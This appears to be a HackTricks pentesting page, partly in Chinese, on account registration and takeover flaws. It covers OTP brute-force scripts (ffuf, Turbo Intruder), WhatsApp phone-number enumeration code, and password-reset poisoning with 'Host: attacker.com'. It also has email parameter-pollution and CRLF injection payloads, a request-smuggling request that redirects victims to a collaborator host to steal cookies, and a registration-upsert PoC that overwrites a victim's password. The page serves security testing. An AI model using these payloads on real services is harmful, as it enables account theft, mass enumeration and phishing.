# 注册与接管漏洞

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- 尝试使用已存在的用户名注册
- 尝试变更邮箱格式：
- 大写
- +1@
- 在邮箱名中添加点
- 在邮箱本地部分使用特殊字符（%00, %09, %20）
- 在邮箱后放置空白字符：`test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- 尝试邮件提供商的规范化技巧（取决于服务）：
- Gmail 忽略点和子地址：`victim+1@gmail.com`, `v.ic.tim@gmail.com` 会送达 `victim@gmail.com`
- 有些提供商在本地部分对大小写不敏感
- 有些提供商接受 Unicode 混淆字符。尝试在本地部分使用同形字符 (homoglyphs) 和软连字符 `\u00AD`
- 滥用这些可：绕过唯一性检查、获得重复账户/workspace 邀请，或阻止受害者注册（临时 DoS），以便准备接管

### Username Enumeration

检查是否能判断用户名是否已在应用中注册。

- 不同的错误消息或 HTTP 状态码
- 时间差异（已存在用户可能触发对 IdP/DB 的查找）
- 针对已知邮箱的注册表单自动填充个人资料数据
- 检查团队/邀请流程：输入邮箱可能会泄露账户是否存在

### Password Policy

在创建用户时检查密码策略（验证是否可以使用弱密码）。  
在这种情况下，你可能尝试对凭证进行暴力破解。

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

注册后尝试更改邮箱，检查该更改是否被正确验证或能否更改为任意邮箱。

### More Checks

- 检查是否可以使用 **disposable emails** (mailinator, yopmail, 1secmail, etc.) 或通过子地址如 `victim+mailinator@gmail.com` 绕过黑名单
- **Long** **password** (>200) leads to **DoS**
- **Check rate limits on account creation**
- 使用 username@**burp_collab**.net 并分析 **callback**
- 如果使用手机号码验证，检查电话解析/注入的边缘情况

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Phone-number–centric messengers expose a **presence oracle** whenever the client syncs contacts. Replaying WhatsApp’s discovery requests historically delivered **>100M lookups per hour**, enabling near-complete account enumerations.

**攻击工作流**

1. **对官方客户端进行插装**以捕获地址簿上传请求（已认证的、规范化为 E.164 的号码 blob）。在重用相同 cookies/设备令牌的情况下，用攻击者生成的号码重放它。
2. **每请求批量号码**：WhatsApp 接受数千个标识符并返回已注册/未注册状态以及元数据 (business, companion, etc.)。离线分析响应以构建目标列表，无需向受害者发送消息。
3. **横向扩展**枚举，使用 SIM banks、cloud devices, or residential proxies 以避免触发单账号/IP/ASN 的限速。

**拨号计划建模**

对每个国家的拨号计划建模以跳过无效候选号。The NDSS dataset (`country-table.*`) 列出国家代码、采用密度和平台分布，便于你优先考虑命中率高的范围。示例播种代码：
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefixes that match real allocations (Mobile Country Code + National Destination Code) before querying the oracle to keep throughput useful.

**Turning enumerations into targeted attacks**

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- Slice censuses by country/OS/app type to find regions with weak SMS filtering or heavy WhatsApp Business adoption for localized social engineering.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. Request identity material for every enumerated number and deduplicate the public keys to reveal account farms, cloned clients, or insecure firmware—shared keys deanonymize multi-SIM operations.

## Weak Email/Phone Verification (OTP/Magic Link)

注册流程通常通过数字 OTP 或 magic-link token 来验证所有权。典型缺陷：

- Guessable or short OTP (4–6 digits) with no effective rate limiting or IP/device tracking. Try parallel guesses and header/IP rotation.
- OTP reuse across actions or accounts, or not bound to the specific user/action (e.g., same code works for login and signup, or works after email is changed).
- Multi-value smuggling: some backends accept multiple codes and verify if any matches. Try:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: 通过状态/消息/正文长度区分 wrong、expired 与 wrong-user codes。
- Tokens not invalidated after success or after password/email change.
- Verification token not tied to user agent/IP allowing cross-origin completion from attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
并行/并发猜测以绕过顺序锁定（在 Burp 中使用 Turbo Intruder）：

<details>
<summary>用于对 6‑digit OTP 进行洪水式尝试的 Turbo Intruder 代码片段</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: 同时在两个会话提交相同的有效 OTP；有时其中一个会话会变成已验证的攻击者账户，而受害者的流程也会成功。
- Also test Host header poisoning on verification links (same as reset poisoning below) 来在攻击者控制的主机上 leak 或完成验证。

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

A powerful class of issues occurs when an attacker performs actions on the victim’s email before the victim creates their account, then regains access later.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
  - 攻击者：使用受害者的邮箱注册一个 classic 账户并设置密码
  - 受害者：随后用 SSO（相同邮箱）注册
  - 不安全的合并可能导致双方都保持登录状态，或恢复攻击者的访问权限
- Unexpired Session Identifier
  - 攻击者：创建账户并保持长期会话（不要登出）
  - 受害者：恢复/设置密码并开始使用该账户
  - 测试在重置或启用 MFA 后旧会话是否仍然有效
- Trojan Identifier
  - 攻击者：在预先创建的账户上添加次要标识符（电话、额外邮箱，或将攻击者的 IdP 关联上去）
  - 受害者：重置密码；随后攻击者使用该 trojan identifier 来重置/登录
- Unexpired Email Change
  - 攻击者：发起将邮箱改为攻击者邮箱的操作并拒绝确认
  - 受害者：恢复账户并开始使用
  - 攻击者：随后完成待定的邮箱更改以窃取账户
- Non‑Verifying IdP
  - 攻击者：使用不验证邮箱所有权的 IdP 来断言 `victim@…`
  - 受害者：通过 classic 路径注册
  - 服务仅根据邮箱合并，而不检查 `email_verified` 或执行本地验证

实用建议

- 从 web/mobile 包中收集流程和端点。查找 classic signup、SSO linking、email/phone change 和 password reset 端点。
- 创建真实的自动化来保持会话活跃，同时测试其他流程。
- 对于 SSO 测试，搭建一个测试 OIDC provider 并为受害者地址签发带有 `email` 声明且 `email_verified=false` 的 token，以检查 RP 是否信任未验证的 IdP。
- 在任何密码重置或邮箱更改之后，验证：
  - 所有其他会话和 token 都被使无效，
  - 待定的邮箱/电话更改功能被取消，
  - 之前关联的 IdP/邮箱/电话需重新验证。

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. 向你的邮箱请求 password reset
2. 点击 password reset 链接
3. 不要更改密码
4. 点击任意第三方网站（eg: Facebook, twitter）
5. 在 Burp Suite proxy 中拦截请求
6. 检查 referer header 是否在 leak password reset token。

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. 在 Burp Suite 中拦截 password reset 请求
2. 在 Burp Suite 中添加或编辑以下 headers : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. 转发带有修改 header 的请求\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. 查找基于 _host header_ 的 password reset URL，例如： `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. 攻击者需要使用自己的账号登录并进入 **Change password** 功能。
2. 启动 Burp Suite 并拦截请求
3. 将请求发送到 repeater 选项卡并编辑参数：User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

密码重置令牌应当每次随机生成且唯一。\
尝试判断令牌是否会过期或是否始终相同，在某些情况下生成算法很弱且可被猜测。以下变量可能被算法使用。

- 时间戳
- UserID
- 用户邮箱
- 名和姓
- 出生日期
- 加密
- 仅数字
- 短令牌序列（字符在 \[A-Z,a-z,0-9] 之间）
- 令牌重用
- 令牌过期时间

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. 使用 API/UI 触发对特定邮箱的密码重置请求，例如：test@mail.com
2. 检查服务器响应并查看是否包含 `resetToken`
3. 然后在如下 URL 中使用该令牌：`https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 在系统上注册一个用户名与受害者用户名相同，但在用户名前后插入空格。例如：`"admin "`
2. 使用你的恶意用户名发起密码重置请求。
3. 使用发送到你邮箱的令牌重置受害者的密码。
4. 使用新密码登录受害者账户。

The platform CTFd was vulnerable to this attack.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. 在应用或子域中找到 XSS，前提是 cookies 的作用域是父域：`*.domain.com`
2. Leak 当前 **sessions cookie**
3. 使用该 cookie 以该用户身份进行认证

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. 使用 **smuggler** 检测 HTTP Request Smuggling 的类型（CL, TE, CL.TE）\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. 构造一个请求，该请求会用以下数据覆盖 `POST / HTTP/1.1`：\
`GET http://something.burpcollaborator.net HTTP/1.1 X:`，目的是将受害者重定向到 burpcollab 并窃取他们的 cookies\
3. Final request could look like the following
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone 报告利用此漏洞\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### 通过 CSRF 劫持账户 <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. 为 CSRF 创建 payload，例如： “HTML form with auto submit for a password change”
2. 发送 payload

### 通过 JWT 劫持账户 <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

可能使用 JSON Web Token 对用户进行认证。

- 编辑 JWT，将 User ID / Email 替换为其他用户的
- 检查是否存在弱的 JWT 签名


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset（在已存在邮箱上执行 upsert）

一些注册处理程序在提供的邮箱已存在时会执行 upsert。如果该端点接受仅包含邮箱和密码的最小请求体，并且不强制所有权验证，那么发送受害者的邮箱将在未认证的情况下覆盖其密码。

- 发现：从打包的 JS（或移动应用流量）中收集端点名称，然后使用 ffuf/dirsearch 对类似 /parents/application/v4/admin/FUZZ 的基路径进行 fuzz。
- 方法提示：GET 返回类似 "Only POST request is allowed." 的消息通常表明正确的 HTTP 动词，并且期望一个 JSON body。
- 在实战中观察到的最小请求体：
```json
{"email":"victim@example.com","password":"New@12345"}
```
示例 PoC：
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
影响：在无需重置令牌、OTP 或电子邮件验证的情况下实现完全账户接管 (ATO)。

## 参考资料

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
